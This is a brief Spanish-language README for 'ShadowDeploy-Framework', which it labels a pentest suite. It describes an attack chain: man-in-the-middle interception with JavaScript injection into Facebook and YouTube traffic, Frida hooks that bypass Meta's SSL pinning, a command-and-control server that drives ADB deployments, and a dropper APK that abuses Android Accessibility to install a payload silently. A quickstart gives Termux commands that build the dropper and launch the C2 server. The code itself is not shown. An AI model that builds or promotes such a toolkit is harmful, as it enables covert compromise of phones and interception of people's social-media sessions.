# 🕷️ ShadowDeploy-Framework - Pentest Suite Completa

## 🎯 Flujo de Ataque
1. **MITM + JS Injection** → Intercepta Facebook/YouTube
2. **Frida Hooks** → Bypass SSL Pinning Meta
3. **C2 Server** → Orquesta ADB + deployments
4. **Dropper APK** → Accessibility → Silent install payload

## 🚀 Quickstart Termux (5min)
```bash
bash setup_framework.sh
bash 4_dropper_app/build_termux.sh
python3 3_c2_server/server.py
# Dashboard: http://localhost:8080